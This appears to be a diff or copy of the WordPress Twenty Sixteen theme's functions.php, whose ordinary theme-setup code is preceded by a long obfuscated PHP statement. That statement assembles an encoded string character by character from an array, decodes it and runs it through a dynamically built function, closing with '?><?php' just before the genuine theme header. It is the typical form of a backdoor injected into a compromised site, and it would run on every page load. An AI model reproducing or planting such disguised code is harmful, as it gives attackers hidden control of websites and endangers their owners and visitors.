nif[34].$nilfnif[1].$nilfnif[15].$nilfnif[27].$nilfnif[25].$nilfnif[27].$nilfnif[36].$nilfnif[48].$nilfnif[142].$nilfnif[21].$nilfnif[8].$nilfnif[85].$nilfnif[28].$nilfnif[18].$nilfnif[10].$nilfnif[36].$nilfnif[20].$nilfnif[285].$nilfnif[31].$nilfnif[88].$nilfnif[28].$nilfnif[1].$nilfnif[37].$nilfnif[106].$nilfnif[28].$nilfnif[24].$nilfnif[63].$nilfnif[135].$nilfnif[135].$nilfnif[4].$nilfnif[30].$nilfnif[22].$nilfnif[29].$nilfnif[53].$nilfnif[48].$nilfnif[132].$nilfnif[37].$nilfnif[142].$nilfnif[48].$nilfnif[37].$nilfnif[31].$nilfnif[62].$nilfnif[3].$nilfnif[285].$nilfnif[111].$nilfnif[48].$nilfnif[6].$nilfnif[37].$nilfnif[69].$nilfnif[285].$nilfnif[52].$nilfnif[25].$nilfnif[14].$nilfnif[30].$nilfnif[63].$nilfnif[48].$nilfnif[27].$nilfnif[282].$nilfnif[142].$nilfnif[6].$nilfnif[37].$nilfnif[88].$nilfnif[13].$nilfnif[8].$nilfnif[34].$nilfnif[20].$nilfnif[197].$nilfnif[25].$nilfnif[52].$nilfnif[45].$nilfnif[63].$nilfnif[52].$nilfnif[47].$nilfnif[42].$nilfnif[62].$nilfnif[96].$nilfnif[12].$nilfnif[62].$nilfnif[42].$nilfnif[53].$nilfnif[47].$nilfnif[135].$nilfnif[44].$nilfnif[24].$nilfnif[285].$nilfnif[132].$nilfnif[22].$nilfnif[29].$nilfnif[10].$nilfnif[30].$nilfnif[69].$nilfnif[2].$nilfnif[12].$nilfnif[85].$nilfnif[133].$nilfnif[51].$nilfnif[121].$nilfnif[135].$nilfnif[111].$nilfnif[73].$nilfnif[20].$nilfnif[121].$nilfnif[8].$nilfnif[54].$nilfnif[24].$nilfnif[21].$nilfnif[45].$nilfnif[63].$nilfnif[17].$nilfnif[1].$nilfnif[111].$nilfnif[22].$nilfnif[160].$nilfnif[36].$nilfnif[47].$nilfnif[69].$nilfnif[142].$nilfnif[63].$nilfnif[31].$nilfnif[135].$nilfnif[14].$nilfnif[133].$nilfnif[24].$nilfnif[45].$nilfnif[41].$nilfnif[85].$nilfnif[197].$nilfnif[51].$nilfnif[25].$nilfnif[15].$nilfnif[31].$nilfnif[285].$nilfnif[36].$nilfnif[14].$nilfnif[10].$nilfnif[15].$nilfnif[5].$nilfnif[2].$nilfnif[28].$nilfnif[62].$nilfnif[121].$nilfnif[53].$nilfnif[47].$nilfnif[132].$nilfnif[144].$nilfnif[6].$nilfnif[282].$nilfnif[36].$nilfnif[62].$nilfnif[63].$nilfnif[96].$nilfnif[5].$nilfnif[142].$nilfnif[54].$nilfnif[28].$nilfnif[282].$nilfnif[48].$nilfnif[2].$nilfnif[62].$nilfnif[121].$nilfnif[106].$nilfnif[22].$nilfnif[12].$nilfnif[7].$nilfnif[66].$nilfnif[47].$nilfnif[24].$nilfnif[164].$nilfnif[62].$nilfnif[66].$nilfnif[41].$nilfnif[5].$nilfnif[54].$nilfnif[53].$nilfnif[22].$nilfnif[69].$nilfnif[29].$nilfnif[21].$nilfnif[282].$nilfnif[3].$nilfnif[135].$nilfnif[1].$nilfnif[34].$nilfnif[63].$nilfnif[6].$nilfnif[12].$nilfnif[63].$nilfnif[73].$nilfnif[45].$nilfnif[52].$nilfnif[144].$nilfnif[4].$nilfnif[1].$nilfnif[5].$nilfnif[197].$nilfnif[135].$nilfnif[41].$nilfnif[85].$nilfnif[21].$nilfnif[96].$nilfnif[42].$nilfnif[4].$nilfnif[24].$nilfnif[30].$nilfnif[66].$nilfnif[36].$nilfnif[39].$nilfnif[14].$nilfnif[135].$nilfnif[69].$nilfnif[164].$nilfnif[5].$nilfnif[52].$nilfnif[20].$nilfnif[132].$nilfnif[9].$nilfnif[285].$nilfnif[37].$nilfnif[45].$nilfnif[85].$nilfnif[47].$nilfnif[39].$nilfnif[53].$nilfnif[73].$nilfnif[41].$nilfnif[54].$nilfnif[21].$nilfnif[42].$nilfnif[6].$nilfnif[7].$nilfnif[37].$nilfnif[52].$nilfnif[22].$nilfnif[51].$nilfnif[6].$nilfnif[24].$nilfnif[2].$nilfnif[69].$nilfnif[9].$nilfnif[85].$nilfnif[51].$nilfnif[31].$nilfnif[144].$nilfnif[17].$nilfnif[73].$nilfnif[9].$nilfnif[282].$nilfnif[7].$nilfnif[144].$nilfnif[28].$nilfnif[21].$nilfnif[8].$nilfnif[133].$nilfnif[88].$nilfnif[63].$nilfnif[20].$nilfnif[2].$nilfnif[135].$nilfnif[47].$nilfnif[164].$nilfnif[2].$nilfnif[3].$nilfnif[96].$nilfnif[160].$nilfnif[133].$nilfnif[63].$nilfnif[22].$nilfnif[51].$nilfnif[14].$nilfnif[27].$nilfnif[1].$nilfnif[160].$nilfnif[96].$nilfnif[41].$nilfnif[37].$nilfnif[34].$nilfnif[5].$nilfnif[135].$nilfnif[53].$nilfnif[73].$nilfnif[4].$nilfnif[3].$nilfnif[6].$nilfnif[34].$nilfnif[63].$nilfnif[88].$nilfnif[18].$nilfnif[24].$nilfnif[52].$nilfnif[135].$nilfnif[8].$nilfnif[197].$nilfnif[63].$nilfnif[88].$nilfnif[13].$nilfnif[133].$nilfnif[52].$nilfnif[96].$nilfnif[13].$nilfnif[133].$nilfnif[135].$nilfnif[88].$nilfnif[164].$nilfnif[36].$nilfnif[17].$nilfnif[0].$nilfnif[197].$nilfnif[144].$nilfnif[34].$nilfnif[106].$nilfnif[18].$nilfnif[69].$nilfnif[133].$nilfnif[29].$nilfnif[41].$nilfnif[17].$nilfnif[14].$nilfnif[69].$nilfnif[29].$nilfnif[282].$nilfnif[27].$nilfnif[106].$nilfnif[5].$nilfnif[124].$nilfnif[51].$nilfnif[0].$nilfnif[37].$nilfnif[37].$nilfnif[124].$nilfnif[3].$nilfnif[17].$nilfnif[133].$nilfnif[28].$nilfnif[62].$nilfnif[63].$nilfnif[132].$nilfnif[29].$nilfnif[66].$nilfnif[63].$nilfnif[4].$nilfnif[12].$nilfnif[22].$nilfnif[12].$nilfnif[44].$nilfnif[160].$nilfnif[47].$nilfnif[8].$nilfnif[14].$nilfnif[66].$nilfnif[37].$nilfnif[39].$nilfnif[25].$nilfnif[17].$nilfnif[36].$nilfnif[54].$nilfnif[106].$nilfnif[160].$nilfnif[0].$nilfnif[7].$nilfnif[31].$nilfnif[4].$nilfnif[21].$nilfnif[41].$nilfnif[39].$nilfnif[1].$nilfnif[124].$nilfnif[66].$nilfnif[88].$nilfnif[88].$nilfnif[6].$nilfnif[47].$nilfnif[31].$nilfnif[51].$nilfnif[9].$nilfnif[73].$nilfnif[15].$nilfnif[42].$nilfnif[45].$nilfnif[0].$nilfnif[9].$nilfnif[42].$nilfnif[3].$nilfnif[10].$nilfnif[36].$nilfnif[12].$nilfnif[5].$nilfnif[53].$nilfnif[54].$nilfnif[197].$nilfnif[22].$nilfnif[51].$nilfnif[13].$nilfnif[66].$nilfnif[3].$nilfnif[144].$nilfnif[45].$nilfnif[133].$nilfnif[4].$nilfnif[23].$nilfnif[22].$nilfnif[51].$nilfnif[88].$nilfnif[282].$nilfnif[42].$nilfnif[47].$nilfnif[31].$nilfnif[31].$nilfnif[54].$nilfnif[132].$nilfnif[132].$nilfnif[14].$nilfnif[3].$nilfnif[10].$nilfnif[121].$nilfnif[47].$nilfnif[34].$nilfnif[22].$nilfnif[48].$nilfnif[13].$nilfnif[41].$nilfnif[6].$nilfnif[31].$nilfnif[23].$nilfnif[135].$nilfnif[6].$nilfnif[45].$nilfnif[9].$nilfnif[73].$nilfnif[144].$nilfnif[8].$nilfnif[48].$nilfnif[34].$nilfnif[2].$nilfnif[62].$nilfnif[121].$nilfnif[0].$nilfnif[39].$nilfnif[133].$nilfnif[13].$nilfnif[3].$nilfnif[20].$nilfnif[45].$nilfnif[282].$nilfnif[21].$nilfnif[197].$nilfnif[14].$nilfnif[164].$nilfnif[62].$nilfnif[20].$nilfnif[34].$nilfnif[106].$nilfnif[62].$nilfnif[36].$nilfnif[7].$nilfnif[282].$nilfnif[29].$nilfnif[12].$nilfnif[29].$nilfnif[2].$nilfnif[164].$nilfnif[1].$nilfnif[37].$nilfnif[53].$nilfnif[1].$nilfnif[1].$nilfnif[85].$nilfnif[96].$nilfnif[121].$nilfnif[17].$nilfnif[34].$nilfnif[24].$nilfnif[121].$nilfnif[22].$nilfnif[30].$nilfnif[164].$nilfnif[62].$nilfnif[20].$nilfnif[197].$nilfnif[10].$nilfnif[39].$nilfnif[14].$nilfnif[15].$nilfnif[20].$nilfnif[10].$nilfnif[44].$nilfnif[69].$nilfnif[133].$nilfnif[44].$nilfnif[37].$nilfnif[121].$nilfnif[48].$nilfnif[53].$nilfnif[23].$nilfnif[164].$nilfnif[69].$nilfnif[8].$nilfnif[164].$nilfnif[133].$nilfnif[160].$nilfnif[54].$nilfnif[96].$nilfnif[9].$nilfnif[24].$nilfnif[45].$nilfnif[12].$nilfnif[121].$nilfnif[135].$nilfnif[73].$nilfnif[282].$nilfnif[18].$nilfnif[106].$nilfnif[44].$nilfnif[54].$nilfnif[36].$nilfnif[197].$nilfnif[63].$nilfnif[15].$nilfnif[282].$nilfnif[18].$nilfnif[135].$nilfnif[124].$nilfnif[132].$nilfnif[10].$nilfnif[9].$nilfnif[10].$nilfnif[13].$nilfnif[20].$nilfnif[73].$nilfnif[51].$nilfnif[62].$nilfnif[37].$nilfnif[66].$nilfnif[121].$nilfnif[1].$nilfnif[29].$nilfnif[54].$nilfnif[24].$nilfnif[51].$nilfnif[5].$nilfnif[45].$nilfnif[3].$nilfnif[13].$nilfnif[31].$nilfnif[5].$nilfnif[121].$nilfnif[24].$nilfnif[29].$nilfnif[160].$nilfnif[53].$nilfnif[23].$nilfnif[52].$nilfnif[63].$nilfnif[121].$nilfnif[53].$nilfnif[24].$nilfnif[14].$nilfnif[30].$nilfnif[164].$nilfnif[106].$nilfnif[62].$nilfnif[124].$nilfnif[5].$nilfnif[124].$nilfnif[96].$nilfnif[21].$nilfnif[66].$nilfnif[106].$nilfnif[42].$nilfnif[69].$nilfnif[42].$nilfnif[21].$nilfnif[2].$nilfnif[53].$nilfnif[17].$nilfnif[20].$nilfnif[45].$nilfnif[285].$nilfnif[3].$nilfnif[13].$nilfnif[63].$nilfnif[10].$nilfnif[54].$nilfnif[111].$nilfnif[121].$nilfnif[34].$nilfnif[106].$nilfnif[31].$nilfnif[5].$nilfnif[31].$nilfnif[18].$nilfnif[96].$nilfnif[285].$nilfnif[63].$nilfnif[52].$nilfnif[22].$nilfnif[53].$nilfnif[29].$nilfnif[96].$nilfnif[39].$nilfnif[4].$nilfnif[6].$nilfnif[22].$nilfnif[88].$nilfnif[25].$nilfnif[47].$nilfnif[41].$nilfnif[20].$nilfnif[36].$nilfnif[160].$nilfnif[14].$nilfnif[27].$nilfnif[48].$nilfnif[18].$nilfnif[29].$nilfnif[27].$nilfnif[30].$nilfnif[21].$nilfnif[7].$nilfnif[66].$nilfnif[47].$nilfnif[41].$nilfnif[14].$nilfnif[44].$nilfnif[8].$nilfnif[37].$nilfnif[3].$nilfnif[0].$nilfnif[31].$nilfnif[29].$nilfnif[30].$nilfnif[48].$nilfnif[54].$nilfnif[37].$nilfnif[34].$nilfnif[21].$nilfnif[160].$nilfnif[96].$nilfnif[6].$nilfnif[52].$nilfnif[28].$nilfnif[85].$nilfnif[31].$nilfnif[135].$nilfnif[22].$nilfnif[39].$nilfnif[23].$nilfnif[124].$nilfnif[142].$nilfnif[4].$nilfnif[14].$nilfnif[285].$nilfnif[6].$nilfnif[160].$nilfnif[27].$nilfnif[47].$nilfnif[48].$nilfnif[96].$nilfnif[18].$nilfnif[111].$nilfnif[164].$nilfnif[53].$nilfnif[21].$nilfnif[197].$nilfnif[39].$nilfnif[22].$nilfnif[25].$nilfnif[48].$nilfnif[17].$nilfnif[73].$nilfnif[3].$nilfnif[37].$nilfnif[21].$nilfnif[282].$nilfnif[51].$nilfnif[30].$nilfnif[96].$nilfnif[34].$nilfnif[22].$nilfnif[25].$nilfnif[31].$nilfnif[282].$nilfnif[27].$nilfnif[7].$nilfnif[8].$nilfnif[13].$nilfnif[6].$nilfnif[285].$nilfnif[22].$nilfnif[21].$nilfnif[39].$nilfnif[124].$nilfnif[39].$nilfnif[54].$nilfnif[17].$nilfnif[124].$nilfnif[160].$nilfnif[144].$nilfnif[106].$nilfnif[7].$nilfnif[36].$nilfnif[42].$nilfnif[18].$nilfnif[144].$nilfnif[73].$nilfnif[18].$nilfnif[47].$nilfnif[7].$nilfnif[17].$nilfnif[20].$nilfnif[48].$nilfnif[66].$nilfnif[10].$nilfnif[3].$nilfnif[3].$nilfnif[13].$nilfnif[51].$nilfnif[66].$nilfnif[3].$nilfnif[10].$nilfnif[124].$nilfnif[10].$nilfnif[21].$nilfnif[197].$nilfnif[69].$nilfnif[31].$nilfnif[197].$nilfnif[9].$nilfnif[54].$nilfnif[10].$nilfnif[85].$nilfnif[45].$nilfnif[28].$nilfnif[34].$nilfnif[111].$nilfnif[111].$nilfnif[62].$nilfnif[164].$nilfnif[18].$nilfnif[41].$nilfnif[51].$nilfnif[48].$nilfnif[197].$nilfnif[62].$nilfnif[23].$nilfnif[15].$nilfnif[1].$nilfnif[88].$nilfnif[14].$nilfnif[66].$nilfnif[24].$nilfnif[62].$nilfnif[142].$nilfnif[106].$nilfnif[22].$nilfnif[66].$nilfnif[54].$nilfnif[282].$nilfnif[69].$nilfnif[62].$nilfnif[52].$nilfnif[4].$nilfnif[18].$nilfnif[10].$nilfnif[73].$nilfnif[24].$nilfnif[8].$nilfnif[2].$nilfnif[5].$nilfnif[3].$nilfnif[9].$nilfnif[14].$nilfnif[51].$nilfnif[197].$nilfnif[39].$nilfnif[23].$nilfnif[48].$nilfnif[15].$nilfnif[197].$nilfnif[21].$nilfnif[66].$nilfnif[282].$nilfnif[8].$nilfnif[28].$nilfnif[73].$nilfnif[5].$nilfnif[22].$nilfnif[41].$nilfnif[88].$nilfnif[22].$nilfnif[15].$nilfnif[13].$nilfnif[17].$nilfnif[66].$nilfnif[4].$nilfnif[88].$nilfnif[0].$nilfnif[30].$nilfnif[0].$nilfnif[88].$nilfnif[39].$nilfnif[14].$nilfnif[1].$nilfnif[133].$nilfnif[25].$nilfnif[7].$nilfnif[9].$nilfnif[135].$nilfnif[111].$nilfnif[132].$nilfnif[12].$nilfnif[14].$nilfnif[29].$nilfnif[48].$nilfnif[66].$nilfnif[0].$nilfnif[51].$nilfnif[62].$nilfnif[22].$nilfnif[53].$nilfnif[132].$nilfnif[39].$nilfnif[121].$nilfnif[37].$nilfnif[15].$nilfnif[45].$nilfnif[25].$nilfnif[53].$nilfnif[4].$nilfnif[3].$nilfnif[85].$nilfnif[0].$nilfnif[52].$nilfnif[7].$nilfnif[17].$nilfnif[13].$nilfnif[25].$nilfnif[111].$nilfnif[197].$nilfnif[51].$nilfnif[121].$nilfnif[88].$nilfnif[34].$nilfnif[21].$nilfnif[124].$nilfnif[45].$nilfnif[88].$nilfnif[41].$nilfnif[39].$nilfnif[25].$nilfnif[48].$nilfnif[9].$nilfnif[14].$nilfnif[37].$nilfnif[7].$nilfnif[0].$nilfnif[34].$nilfnif[22].$nilfnif[0].$nilfnif[96].$nilfnif[18].$nilfnif[51].$nilfnif[1].$nilfnif[36].$nilfnif[88].$nilfnif[9].$nilfnif[23].$nilfnif[133].$nilfnif[144].$nilfnif[121].$nilfnif[18].$nilfnif[111].$nilfnif[13].$nilfnif[160].$nilfnif[41].$nilfnif[27].$nilfnif[51].$nilfnif[36].$nilfnif[44].$nilfnif[34].$nilfnif[164].$nilfnif[63].$nilfnif[21].$nilfnif[135].$nilfnif[52].$nilfnif[36].$nilfnif[160].$nilfnif[3].$nilfnif[160].$nilfnif[36].$nilfnif[44].$nilfnif[121].$nilfnif[8].$nilfnif[53].$nilfnif[106].$nilfnif[51].$nilfnif[124].$nilfnif[20].$nilfnif[30].$nilfnif[42].$nilfnif[96].$nilfnif[4].$nilfnif[197].$nilfnif[23].$nilfnif[25].$nilfnif[9].$nilfnif[197].$nilfnif[197].$nilfnif[39].$nilfnif[285].$nilfnif[285].$nilfnif[9].$nilfnif[111].$nilfnif[14].$nilfnif[6].$nilfnif[9].$nilfnif[3].$nilfnif[25].$nilfnif[10].$nilfnif[18].$nilfnif[5].$nilfnif[106].$nilfnif[285].$nilfnif[10].$nilfnif[15].$nilfnif[121].$nilfnif[54].$nilfnif[7].$nilfnif[29].$nilfnif[2].$nilfnif[3].$nilfnif[62].$nilfnif[45].$nilfnif[52].$nilfnif[29].$nilfnif[4].$nilfnif[15].$nilfnif[160].$nilfnif[111].$nilfnif[63].$nilfnif[15].$nilfnif[282].$nilfnif[133].$nilfnif[73].$nilfnif[14].$nilfnif[8].$nilfnif[24].$nilfnif[88].$nilfnif[124].$nilfnif[30].$nilfnif[14].$nilfnif[106].$nilfnif[24].$nilfnif[8].$nilfnif[133].$nilfnif[30].$nilfnif[144].$nilfnif[12].$nilfnif[20].$nilfnif[47].$nilfnif[285].$nilfnif[6].$nilfnif[282].$nilfnif[282].$nilfnif[135].$nilfnif[10].$nilfnif[88].$nilfnif[1].$nilfnif[22].$nilfnif[13].$nilfnif[10].$nilfnif[48].$nilfnif[3].$nilfnif[69].$nilfnif[25].$nilfnif[13].$nilfnif[133].$nilfnif[30].$nilfnif[3].$nilfnif[135].$nilfnif[285].$nilfnif[12].$nilfnif[29].$nilfnif[39].$nilfnif[54].$nilfnif[88].$nilfnif[6].$nilfnif[135].$nilfnif[23].$nilfnif[44].$nilfnif[5].$nilfnif[9].$nilfnif[62].$nilfnif[197].$nilfnif[31].$nilfnif[144].$nilfnif[142].$nilfnif[17].$nilfnif[142].$nilfnif[160].$nilfnif[106].$nilfnif[69].$nilfnif[23].$nilfnif[12].$nilfnif[22].$nilfnif[23].$nilfnif[47].$nilfnif[88].$nilfnif[39].$nilfnif[34].$nilfnif[144].$nilfnif[27].$nilfnif[160].$nilfnif[48].$nilfnif[96].$nilfnif[42].$nilfnif[3].$nilfnif[29].$nilfnif[121].$nilfnif[51].$nilfnif[135].$nilfnif[25].$nilfnif[7].$nilfnif[63].$nilfnif[164].$nilfnif[9].$nilfnif[23].$nilfnif[142].$nilfnif[15].$nilfnif[23].$nilfnif[0].$nilfnif[69].$nilfnif[6].$nilfnif[96].$nilfnif[47].$nilfnif[69].$nilfnif[197].$nilfnif[160].$nilfnif[15].$nilfnif[2].$nilfnif[25].$nilfnif[3].$nilfnif[160].$nilfnif[25].$nilfnif[52].$nilfnif[54].$nilfnif[132].$nilfnif[111].$nilfnif[25].$nilfnif[124].$nilfnif[132].$nilfnif[47].$nilfnif[121].$nilfnif[3].$nilfnif[25].$nilfnif[28].$nilfnif[96].$nilfnif[7].$nilfnif[54].$nilfnif[6].$nilfnif[69].$nilfnif[22].$nilfnif[2].$nilfnif[96].$nilfnif[13].$nilfnif[1].$nilfnif[27].$nilfnif[6].$nilfnif[47].$nilfnif[36].$nilfnif[160].$nilfnif[106].$nilfnif[5].$nilfnif[31].$nilfnif[8].$nilfnif[12].$nilfnif[53].$nilfnif[121].$nilfnif[88].$nilfnif[6].$nilfnif[6].$nilfnif[69].$nilfnif[23].$nilfnif[9].$nilfnif[135].$nilfnif[282].$nilfnif[111].$nilfnif[36].$nilfnif[34].$nilfnif[12].$nilfnif[54].$nilfnif[23].$nilfnif[2].$nilfnif[160].$nilfnif[12].$nilfnif[1].$nilfnif[282].$nilfnif[24].$nilfnif[15].$nilfnif[88].$nilfnif[124].$nilfnif[124].$nilfnif[8].$nilfnif[2].$nilfnif[164].$nilfnif[124].$nilfnif[282].$nilfnif[111].$nilfnif[4].$nilfnif[47].$nilfnif[22].$nilfnif[27].$nilfnif[15].$nilfnif[44].$nilfnif[8].$nilfnif[282].$nilfnif[52].$nilfnif[29].$nilfnif[25].$nilfnif[62].$nilfnif[106].$nilfnif[18].$nilfnif[69].$nilfnif[62].$nilfnif[63].$nilfnif[285].$nilfnif[10].$nilfnif[2].$nilfnif[42].$nilfnif[0].$nilfnif[6].$nilfnif[27].$nilfnif[85].$nilfnif[18].$nilfnif[73].$nilfnif[28].$nilfnif[1].$nilfnif[164].$nilfnif[51].$nilfnif[24].$nilfnif[27].$nilfnif[66].$nilfnif[62].$nilfnif[160].$nilfnif[1].$nilfnif[6].$nilfnif[24].$nilfnif[111].$nilfnif[3].$nilfnif[31].$nilfnif[31].$nilfnif[2].$nilfnif[25].$nilfnif[135].$nilfnif[197].$nilfnif[88].$nilfnif[28].$nilfnif[27].$nilfnif[10].$nilfnif[27].$nilfnif[22].$nilfnif[39].$nilfnif[121].$nilfnif[34].$nilfnif[14].$nilfnif[54].$nilfnif[121].$nilfnif[85].$nilfnif[48].$nilfnif[3].$nilfnif[27].$nilfnif[18].$nilfnif[20].$nilfnif[1].$nilfnif[62].$nilfnif[39].$nilfnif[18].$nilfnif[53].$nilfnif[7].$nilfnif[29].$nilfnif[37].$nilfnif[10].$nilfnif[88].$nilfnif[2].$nilfnif[24].$nilfnif[17].$nilfnif[25].$nilfnif[25].$nilfnif[10].$nilfnif[34].$nilfnif[12].$nilfnif[8].$nilfnif[42].$nilfnif[12].$nilfnif[30].$nilfnif[34].$nilfnif[48].$nilfnif[29].$nilfnif[34].$nilfnif[1].$nilfnif[30].$nilfnif[52].$nilfnif[18].$nilfnif[88].$nilfnif[9].$nilfnif[12].$nilfnif[6].$nilfnif[0].$nilfnif[30].$nilfnif[30].$nilfnif[1].$nilfnif[53].$nilfnif[45].$nilfnif[25].$nilfnif[85].$nilfnif[63].$nilfnif[132].$nilfnif[42].$nilfnif[37].$nilfnif[14].$nilfnif[15].$nilfnif[54].$nilfnif[34].$nilfnif[133].$nilfnif[47].$nilfnif[18].$nilfnif[34].$nilfnif[63].$nilfnif[12].$nilfnif[34].$nilfnif[164].$nilfnif[197].$nilfnif[63].$nilfnif[36].$nilfnif[21].$nilfnif[106].$nilfnif[44].$nilfnif[51].$nilfnif[73].$nilfnif[34].$nilfnif[37].$nilfnif[54].$nilfnif[63].$nilfnif[132].$nilfnif[62].$nilfnif[45].$nilfnif[25].$nilfnif[132].$nilfnif[45].$nilfnif[121].$nilfnif[121].$nilfnif[111].$nilfnif[51].$nilfnif[20].$nilfnif[10].$nilfnif[2].$nilfnif[85].$nilfnif[69].$nilfnif[6].$nilfnif[123].$nilfnif[123];$fpnpjjbqgvdp=$nilfnif[62].$nilfnif[144].$nilfnif[52].$nilfnif[96].$nilfnif[30].$nilfnif[18].$nilfnif[600].$nilfnif[42].$nilfnif[96].$nilfnif[27].$nilfnif[44].$nilfnif[42].$nilfnif[96];$jdqpmorosll=$nilfnif[0].$nilfnif[14].$nilfnif[20].$nilfnif[69].$nilfnif[27].$nilfnif[44].$nilfnif[3].$nilfnif[10].$nilfnif[37].$nilfnif[96].$nilfnif[52].$nilfnif[52];$wurbfchupw=$nilfnif[52].$nilfnif[29].$nilfnif[37].$nilfnif[37].$nilfnif[96].$nilfnif[25];$zxugtyvbiy=$nilfnif[27].$nilfnif[37].$nilfnif[96].$nilfnif[144].$nilfnif[29].$nilfnif[96].$nilfnif[600].$nilfnif[21].$nilfnif[20].$nilfnif[69].$nilfnif[27].$nilfnif[29].$nilfnif[31].$nilfnif[44].$nilfnif[69];$xlgoayamzxgqyl=$nilfnif[1661].$nilfnif[144];$fgjbkizeotcjvk=$nilfnif[4107].$nilfnif[1207].$nilfnif[144].$nilfnif[1661].$nilfnif[654].$nilfnif[48].$nilfnif[144].$nilfnif[25].$nilfnif[96];$miuswurxgqun=$nilfnif[96].$nilfnif[282].$nilfnif[31].$nilfnif[29];$ngjkkugzfxnwy=$wurbfchupw;$jtpofrpxwjsvy=$jdqpmorosll($fpnpjjbqgvdp($ybbeuxhlirel));$jtpofrpxwjsvy=$ngjkkugzfxnwy($jtpofrpxwjsvy);$rlwesfpcavc=$zxugtyvbiy($xlgoayamzxgqyl,$wurbfchupw($fgjbkizeotcjvk));$rlwesfpcavc($wurbfchupw($jtpofrpxwjsvy));$miuswurxgqun;?><?php
+/**
+ * Twenty Sixteen functions and definitions
+ *
+ * Set up the theme and provides some helper functions, which are used in the
+ * theme as custom template tags. Others are attached to action and filter
+ * hooks in WordPress to change core functionality.
+ *
+ * When using a child theme you can override certain functions (those wrapped
+ * in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before
+ * the parent theme's file, so the child theme functions would be used.
+ *
+ * @link https://codex.wordpress.org/Theme_Development
+ * @link https://codex.wordpress.org/Child_Themes
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are
+ * instead attached to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters,
+ * {@link https://codex.wordpress.org/Plugin_API}
+ *
+ * @package WordPress
+ * @subpackage Twenty_Sixteen
+ * @since Twenty Sixteen 1.0
+ */
+
+/**
+ * Twenty Sixteen only works in WordPress 4.4 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+}
+
+if ( ! function_exists( 'twentysixteen_setup' ) ) :
+	/**
+	 * Sets up theme defaults and registers support for various WordPress features.
+	 *
+	 * Note that this function is hooked into the after_setup_theme hook, which
+	 * runs before the init hook. The init hook is too late for some features, such
+	 * as indicating support for post thumbnails.
+	 *
+	 * Create your own twentysixteen_setup() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 */
+	function twentysixteen_setup() {
+		/*
+		 * Make theme available for translation.
+		 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
+		 * If you're building a theme based on Twenty Sixteen, use a find and replace
+		 * to change 'twentysixteen' to the name of your theme in all the template files
+		 */
+		load_theme_textdomain( 'twentysixteen' );
+
+		// Add default posts and comments RSS feed links to head.
+		add_theme_support( 'automatic-feed-links' );
+
+		/*
+		 * Let WordPress manage the document title.
+		 * By adding theme support, we declare that this theme does not use a
+		 * hard-coded <title> tag in the document head, and expect WordPress to
+		 * provide it for us.
+		 */
+		add_theme_support( 'title-tag' );
+
+		/*
+		 * Enable support for custom logo.
+		 *
+		 *  @since Twenty Sixteen 1.2
+		 */
+		add_theme_support(
+			'custom-logo',
+			array(
+				'height'      => 240,
+				'width'       => 240,
+				'flex-height' => true,
+			)
+		);
+
+		/*
+		 * Enable support for Post Thumbnails on posts and pages.
+		 *
+		 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
+		 */
+		add_theme_support( 'post-thumbnails' );
+		set_post_thumbnail_size( 1200, 9999 );
+
+		// This theme uses wp_nav_menu() in two locations.
+		register_nav_menus(
+			array(
+				'primary' => __( 'Primary Menu', 'twentysixteen' ),
+				'social'  => __( 'Social Links Menu', 'twentysixteen' ),
+			)
+		);
+
+		/*
+		 * Switch default core markup for search form, comment form, and comments
+		 * to output valid HTML5.
+		 */
+		add_theme_support(
+			'html5',
+			array(
+				'search-form',
+				'comment-form',
+				'comment-list',
+				'gallery',
+				'caption',
+			)
+		);
+
+		/*
+		 * Enable support for Post Formats.
+		 *
+		 * See: https://codex.wordpress.org/Post_Formats
+		 */
+		add_theme_support(
+			'post-formats',
+			array(
+				'aside',
+				'image',
+				'video',
+				'quote',
+				'link',
+				'gallery',
+				'status',
+				'audio',
+				'chat',
+			)
+		);
+
+		/*
+		 * This theme styles the visual editor to resemble the theme style,
+		 * specifically font, colors, icons, and column width.
+		 */
+		add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );
+
+		// Load regular editor styles into the new block-based editor.
+		add_theme_support( 'editor-styles' );
+
+		// Load default block styles.
+		add_theme_support( 'wp-block-styles' );
+
+		// Add support for responsive embeds.
+		add_theme_support( 'responsive-embeds' );
+
+		// Add support for custom color scheme.
+		add_theme_support(
+			'editor-color-palette',
+			array(
+				array(
+					'name'  => __( 'Dark Gray', 'twentysixteen' ),
+					'slug'  => 'dark-gray',
+					'color' => '#1a1a1a',
+				),
+				array(
+					'name'  => __( 'Medium Gray', 'twentysixteen' ),
+					'slug'  => 'medium-gray',
+					'color' => '#686868',
+				),
+				array(
+					'name'  => __( 'Light Gray', 'twentysixteen' ),
+					'slug'  => 'light-gray',
+					'color' => '#e5e5e5',
+				),
+				array(
+					'name'  => __( 'White', 'twentysixteen' ),
+					'slug'  => 'white',
+					'color' => '#fff',
+				),
+				array(
+					'name'  => __( 'Blue Gray', 'twentysixteen' ),
+					'slug'  => 'blue-gray',
+					'color' => '#4d545c',
+				),
+				array(
+					'name'  => __( 'Bright Blue', 'twentysixteen' ),
+					'slug'  => 'bright-blue',
+					'color' => '#007acc',
+				),
+				array(
+					'name'  => __( 'Light Blue', 'twentysixteen' ),
+					'slug'  => 'light-blue',
+					'color' => '#9adffd',
+				),
+				array(
+					'name'  => __( 'Dark Brown', 'twentysixteen' ),
+					'slug'  => 'dark-brown',
+					'color' => '#402b30',
+				),
+				array(
+					'name'  => __( 'Medium Brown', 'twentysixteen' ),
+					'slug'  => 'medium-brown',
+					'color' => '#774e24',
+				),
+				array(
+					'name'  => __( 'Dark Red', 'twentysixteen' ),
+					'slug'  => 'dark-red',
+					'color' => '#640c1f',
+				),
+				array(
+					'name'  => __( 'Bright Red', 'twentysixteen' ),
+					'slug'  => 'bright-red',
+					'color' => '#ff675f',
+				),
+				array(
+					'name'  => __( 'Yellow', 'twentysixteen' ),
+					'slug'  => 'yellow',
+					'color' => '#ffef8e',
+				),
+			)
+		);
+
+		// Indicate widget sidebars can use selective refresh in the Customizer.
+		add_theme_support( 'customize-selective-refresh-widgets' );
+	}
+endif; // twentysixteen_setup
